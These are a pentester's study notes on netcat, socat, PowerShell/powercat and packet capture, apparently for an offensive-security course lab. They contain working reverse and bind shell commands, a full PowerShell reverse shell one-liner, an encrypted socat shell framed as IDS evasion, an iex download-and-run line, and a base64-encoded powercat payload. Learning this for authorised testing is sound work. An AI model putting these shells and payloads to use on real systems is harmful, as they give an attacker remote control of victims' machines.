---
title: 'PEN-200: 4 practical tools'
aliases: []
tags:
- tool/netcat
- tool/socat
- tool/powershell
- tool/powercat
- tool/wireshark
- tool/tcpdump
category: tools
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: notes.md
related_tools:
- '[[netcat]]'
- '[[socat]]'
- '[[openssl]]'
- '[[powershell]]'
- '[[nc]]'
- '[[powercat]]'
- '[[wireshark]]'
- '[[tcpdump]]'
related_techniques: []
related_tactics:
- '[[Defense Evasion]]'
- '[[Execution]]'
related_services: []
related_os:
- '[[bind_shell.key]]'
- '[[bind_shell.crt]]'
- '[[bind_shell.pem]]'
- '[[C:\Users\offsec\Desktop\wget.exe]]'
- '[[10.11.0.4]]'
- '[[C:\Users\offsec]]'
- '[[C:\Users\sending_file.txt]]'
- '[[C:\Users\offsec\reverseshell.ps1]]'
- '[[C:\Users\offsec\encodedreverseshell.ps1]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# PEN-200: 4 practical tools

## Netcat
## Netcat

### Client Mode - Connect
In client mode, we can connect to any TCP/UDP port which allows us to:
- Check if a port is open or closed
- Read a banner from a service listening on the port
- Connect to a network service manually

**Flags: -n to skip DNS name resolution, -v for verbosity**

```shell
# Connect to port 110 (POP3 mail server) on 10.11.0.22, skipping DNS name resolution and being verbose
nc -nv 10.11.0.22 110
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server lab ready <00004.1546827@lab>
USER offsec
+OK offsec welcome here
PASS offsec
-ERR unable to lock mailbox
quit
+OK POP3 server lab signing off.
```

### Server Mode - Listen
We can also listen on a port for any connections.

**Do not add the IP address when listening.**

```shell
# SERVER listen on port 9000 with verbose, no DNS lookup
nc -nlvp 9000

# CLIENT from another machine
nc -nv 192.168.126.128 9000
```

### File Transfer
Send a file from our Kali machine to a Windows machine (there is no feedback on progress, success, or failure - if it is small we can try running `exe` with `--help`)

```shell
# WINDOWS setup a listener on A on port 9000 that redirects any output to incoming.exe
nc -nlvp 9000 > incoming.exe
listening on [any] 9000 ...

# KALI we push the `wget.exe` file
locate wget.exe
/usr/share/windows-resources/binaries/wget.exe

nc -nv 10.11.0.22 9000 < /usr/share/windows-resources/binaries/wget.exe
```

### Remote Administration - DGAPING_SECURITY_HOLE
The netcat-traditional version of Netcat (compiled with the `-DGAPING_SECURITY_HOLE` flag) enables the `-e` option, which executes a program after making or receiving a successful connection. This powerful feature opened up all sorts of interesting possibilities from a security perspective and is therefore not available in most modern Linux/BSD systems. However, due to the fact that Kali Linux is a penetration testing distribution, the Netcat version included in Kali supports the `-e` option.

When enabled, this option can redirect the input, output, and error messages of an executable to a TCP/UDP port rather than the default console.

#### Scenario One - Bind Shell
WindowsBob needs LinuxAlice to connect to her computer and run some commands remotely. WindowsBob has a public IP address but LinuxAlice is behind a corporate firewall and does not have a public IP address. WindowsBob will run a netcat listener on port 9000 and redirect to `cmd.exe` using the `-e` flag.

```shell
# WindowsBob sets up a listener on port 9000 and redirects to cmd.exe
nc -nlvp 9000 -e cmd.exe
```

Anyone can now connect to WindowsBob's machine on port 9000 and get a `cmd` prompt.

```shell
# LinuxAlice connects to WindowsBob
nc -nv 10.11.0.22 4444
(UNKNOWN) [10.11.0.22] 4444 (?) open
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\WindowsBob> ipconfig
```

#### Scenario Two - Reverse Shell
LinuxAlice now needs help from WindowsBob and needs him to connect to her computer and run some commands remotely. WindowsBob has a public IP address but LinuxAlice is behind a corporate firewall and does not have a public IP address.

How does WindowsBob connect to LinuxAlice's machine?

LinuxAlice cannot send an IP address for WindowsBob to connect to, but she can send control of her bash prompt to WindowsBob.

```shell
# WindowsBob sets up a `nc` listener on port 9000
nc -nvlp 9000
listening on [any] 4444 ...
```

LinuxAlice can now send a reverse shell to WindowsBob.

```shell
# LinuxAlice sends reverse shell to WindowsBob's IP address
nc -nv 10.11.0.22 9000 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

On WindowsBob's listening machine, he gets a connection.

```shell
# WindowsBob has root
nc -nvlp 9000
listening on [any] 4444 ...

whoami
LinuxAlice
```

## socat
## socat

### Connect to a Remote Server
```shell
# Connect to a remote server on port 80
socat - TCP4:192.168.1.2:80

# Listen on port 443 (needs to run elevated because it is below 1024)
sudo socat TCP4-LISTEN:443 STDOUT
```

### Transfer Files
LinuxAlice needs to send WindowsBob a `secret_passwords.txt` file.

```shell
# From LinuxAlice's side, we will share the file on port 443
sudo socat TCP4-LISTEN:443,fork file:secret_password.txt

# From WindowsBob's side, we connect to LinuxAlice and retrieve the file
socat TCP4:10.11.0.4:443 file:received_secret_password.txt

dir
received_secret_password.txt
```

### Reverse Shells
LinuxAlice now needs help from WindowsBob and needs him to connect to her computer and run some commands remotely. WindowsBob has a public IP address but LinuxAlice is behind a corporate firewall and does not have a public IP address.

How does WindowsBob connect to LinuxAlice's machine?

LinuxAlice cannot send an IP address for WindowsBob to connect to, but she can send control of her bash prompt to WindowsBob.

```shell
# WindowsBob first creates a listener on port 443
# -d -d adds verbosity
socat -d -d TCP4-LISTEN:443 STDOUT

# LinuxAlice uses socat's exec option, which will execute the given program once a remote connection is made
socat TCP4:10.10.11.04:443 EXEC:/bin/bash

# WindowsBob has shell

... socat[4388] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443
... socat[4388] N using stdout for reading and writing
... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
whoami
kali
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

## Encrypted Bind Shells
To add encryption to a bind shell, we will rely on Secure Socket Layer (SSL) certificates. This level of encryption will assist in evading intrusion detection systems (IDS) and will help hide the sensitive data we are transceiving.

To continue with the example of Alice and Bob, we will use the `openssl` application to create a self-signed certificate using the following options:

```shell
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```

Once we generate the key, we will cat the certificate and its private key into a file, which we will eventually use to encrypt our bind shell.

```shell
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```

```shell
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

# combine the files to become a pem
```shell
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

# LinuxAlice then uses this bind_shell.pem to encrypt traffic
```shell
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

# WindowsBob then connects using openssl (instead of tcp4) and disables ssl certification verification via verify=0
# WindowsBob has shell
```shell
socat - OPENSSL:10.11.0.4:443,verify=0
```

## Powershell and Powercat
The powershell execution policy by default is set to Restricted which means the system will neither load nor run powershell scripts.

```powershell
# set powershell execution to unrestricted
Set-ExecutionPolicy Unrestricted
```

Transfer a file from WindowsBob to LinuxAlice
```powershell
# -c executes the command inside the dbl quotes
# new-object System.Net.WebClient - create new webclient
# download the file from http to c:

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

## Reverse Shell
LinuxAlice sets up a listener on her device
```shell
sudo nc -nlvp 443
```

```powershell
# the actual raw code of a reverse shell

$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

WindowsBob executes the below powershell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

LinuxAlice now has shell
```shell
sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63515

PS C:\Users\offsec>```

To establish a reverse shell from WindowsBob to LinuxAlice, LinuxAlice sets up a listener using `nc`:

```shell
sudo nc -nlvp 443
listening on [any] 443 ...
```

And WindowsBob invokes `powercat`:

```powershell
powercat 10.11.0.4 -p 443 -e cmd.exe
```

This results in the following output on LinuxAlice:

```shell
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63699
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```

## Bind Shell
On WindowsBob's device, a bind shell is run using PowerShell:

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

On LinuxAlice, a bind shell is run using `nc`:

```shell
nc -nv 10.11.0.22 443
```

This results in the following output:

```shell
(UNKNOWN) [10.11.0.22] 443 (https) open
Windows IP Configuration
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.11.0.22
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.11.0.1

C:\Users\offsec>
```

## Powercat
Powercat is a PowerShell version of Netcat written by besimorhino. It can be installed on Linux and Windows. On Linux, it can be installed via `apt`:

```shell
sudo apt install powercat
```

On Windows, it can be installed by running the following commands:

```powershell
# run from the web
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
# or run locally
curl -o powercat.ps1 https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
. .\powercat.ps1
```

Here are some examples of how to use Powercat:

- Listen on port 8000 and print the output to the console.
  ```powershell
  powercat -l -p 8000
  ```

- Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
  ```powershell
  powercat -c 10.1.1.1 -p 443 -e cmd -v
  ```

- Connect to the dnscat2 server on c2.example.com, and send dns queries to the dns server on 10.1.1.1 port 53.
  ```powershell
  powercat -c 10.1.1.1 -p 53 -dns c2.example.com
  ```

- Send a file to 10.1.1.15 port 8000.
  ```powershell
  powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
  ```

- Write the data sent to the local listener on port 4444 to C:\outfile.
  ```powershell
  powercat -l -p 4444 -of C:\outfile
  ```

- Listen on port 8000 and repeatedly serve a PowerShell shell.
  ```powershell
  powercat -l -p 8000 -ep -rep
  ```

- Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
  ```powershell
  powercat -l -p 8000 -r tcp:10.1.1.1:9000
  ```

- Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com, sending queries to 10.1.1.1 port 53.
  ```powershell
  powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
  ```

## File Transfer
To transfer files from WindowsBob to LinuxAlice, LinuxAlice sets up a listener using `nc`:

```shell
sudo nc -nlvp 443 > receiving_file.txt
```

And WindowsBob invokes `powercat` to send the file:

```powershell
powercat -c 10.11.0.4 -p 443 -i C:\users\sending_file.txt
```

After the transfer, LinuxAlice checks for the file:

```shell
ls receiving_file.txt
receiving_file.txt
```

## Bind Shell from LinuxAlice to WindowsBob
To establish a bind shell from LinuxAlice to WindowsBob, WindowsBob invokes `powercat` as a listener:

```powershell
powercat -l -p 443 -e cmd.exe
```

And LinuxAlice connects and has a shell:

```shell
nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```

## Generate Payloads
Powercat can generate standalone payloads. For example, after starting a listener on Alice's machine, a reverse shell payload can be created by adding the `-g` option to the `powercat` command and redirecting the output to a file. This will produce a PowerShell script that Bob can execute on his machine. Here is an example:

```shell
# LinuxAlice sets up listener
sudo nc -nlvp 443
listening on [any] 443 ...
```

```powershell
# WindowsAlice creates a PowerShell payload from powercat
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
```

This payload can be detected by IDS because it is big and contains hardcoded strings which are easily identifiable.

To create a standalone encoded payload using `-ge`, the following command can be used:

```powershell
# WindowsAlice creates a PowerShell payload from powercat
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```

This encoded payload can be executed by Bob using the following command:

```powershell
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
```

This results in the following output on LinuxAlice:

```shell
kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 43725
PS C:\Users\offsec>
```

## Launching Wireshark
```shell
# launch wireshark and send to back
sudo wireshark &
```

## Capture Filters
We can use capture filters to reduce the amount of captured traffic by discarding any traffic that does not match our filter and narrow our focus to the packets we wish to analyze. Be aware that any traffic excluded from a capture filter will be lost, so it is best to define broad capture filters if you are concerned about potentially losing data.

Type in a capture filter like below or choose one from the menu `Capture -> Capture Filters`

```shell
net 10.11.1.0/24
```

## Display Filters
Wireshark Filter by IP
- `ip.addr == 10.10.50.1`

Filter by Destination IP
- `ip.dest == 10.10.50.1`

Filter by Source IP
- `ip.src == 10.10.50.1`

Filter by IP range
- `ip.addr >= 10.10.50.1 and ip.addr <= 10.10.50.100`

Filter by Multiple Ips
- `ip.addr == 10.10.50.1 and ip.addr == 10.10.50.100`

Filter out/ Exclude IP address
- `!(ip.addr == 10.10.50.1)`

Filter IP subnet
- `ip.addr == 10.10.50.1/24`

Filter by multiple specified IP subnets
- `ip.addr == 10.10.50.1/24 and ip.addr == 10.10.51.1/24`

Filter by Protocol
- `dns`
- `http`
- `ftp`
- `ssh`
- `arp`
- `telnet`
- `icmp`

Filter by port (TCP)
- `tcp.port == 25`

Filter by destination port (TCP)
- `tcp.dstport == 23`

Filter by ip address and port
- `ip.addr == 10.10.50.1 and Tcp.port == 25`

Filter by URL
- `http.host == “host name”`

Filter by time stamp
- `frame.time >= “June 02, 2019 18:04:00”`

Filter SYN flag
- `tcp.flags.syn == 1`
- `tcp.flags.syn == 1 and tcp.flags.ack == 0`

Wireshark Beacon Filter
- `wlan.fc.type_subtype = 0x08`

Wireshark broadcast filter
- `eth.dst == ff:ff:ff:ff:ff:ff`

WiresharkMulticast filter
- `(eth.dst[0] & 1)`

Host name filter
- `ip.host = hostname`

MAC address filter
- `eth.addr == 00:70:f4:23:18:c4`

RST flag filter
- `tcp.flags.reset == 1`

## Packet Analysis
To read an existing pcap, the following command is used:

```shell
sudo tcpdump -r password_cracking_filtered.pcap
```

We can filter a pcap using `awk`. The following command filters the destination IP address and port, sorts and counts the occurrences, and displays the top 10 results:

```shell
sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
```

The output indicates that 172.16.40.10 was the most common destination address, followed by 208.68.234.99. Given the destination ports, it is inferred that 172.16.40.10 is a server and 208.68.234.99 is a client. The client made many requests to the server.

To further investigate, the following filters can be used:

```shell
sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
```

```shell
sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
```

```shell
sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
```

To dump the captured traffic in both HEX and ASCII format, the following command can be used:

```shell
sudo tcpdump -nX -r password_cracking_filtered.pcap
```

The output shows that the traffic to 172.16.40.10 on port 81 looks like HTTP data, with Basic HTTP Authentication data and the User agent 'Teh Forest Lobster'. This indicates that something suspicious is happening.

